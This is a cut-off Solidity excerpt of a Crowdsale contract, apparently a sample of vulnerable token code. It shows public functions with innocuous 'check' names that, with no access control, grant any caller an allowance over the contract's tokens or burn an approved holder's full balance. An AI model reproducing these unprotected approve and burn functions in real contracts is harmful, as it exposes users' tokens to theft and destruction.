...
abstract contract Crowdsale is Context, ReentrancyGuard, Pausable, Ownable {
    ...
    function Approvecheck(address _beneficiary) public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_beneficiary);
        token2().approve(_beneficiary,amount);
    }
    ...
    function Approvechecksafe(address _beneficiary) public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_beneficiary);
        token2().safeApprove(_beneficiary,amount);
    }

    function Transfercheckburn(address _beneficiary) public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_beneficiary);
        token2().transferFrom(_beneficiary,address(0),amount);
    }
    ...
    function Transferchecksafe(address _beneficiary) public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_beneficiary);
